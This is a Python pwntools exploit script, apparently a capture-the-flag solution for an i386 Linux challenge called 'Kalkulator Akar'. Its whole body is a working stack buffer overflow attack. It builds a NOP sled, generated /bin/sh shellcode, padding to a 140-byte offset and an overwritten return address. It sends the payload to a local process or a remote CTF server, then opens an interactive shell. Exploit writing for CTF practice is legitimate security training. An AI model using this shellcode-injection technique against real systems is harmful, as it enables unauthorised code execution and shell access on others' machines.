#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

# Setup
binary = 'Kalkulator Akar/src/chall'
elf = ELF(binary)

# Local or Remote
if args.REMOTE:
    p = remote('ctf-chall.stembascc.com', 5200)
else:
    p = process(binary)

# Addresses
s3cr37_addr = 0x0804922f

# Generate shellcode
shellcode = asm(shellcraft.i386.linux.sh())

log.info(f"Shellcode length: {len(shellcode)} bytes")
log.info(f"s3cr37 address: {hex(s3cr37_addr)}")

# Build payload
offset = 140
payload = b'\x90' * 20          # NOP sled
payload += shellcode            # Shellcode
payload += b'\x90' * (offset - len(payload))  # Padding to offset
payload += p32(s3cr37_addr)     # Overwrite return address
payload += b'\x90' * 20         # NOP sled on stack after return
payload += shellcode            # Shellcode after return (will be executed)

log.info(f"Payload length: {len(payload)} bytes")

# Receive prompts
p.recvuntil(b'Masukan angkamu: ')

# Send exploit
log.info("Sending payload...")
p.sendline(payload)

# Get shell
log.success("Shell spawned! Enjoy!")
p.interactive()
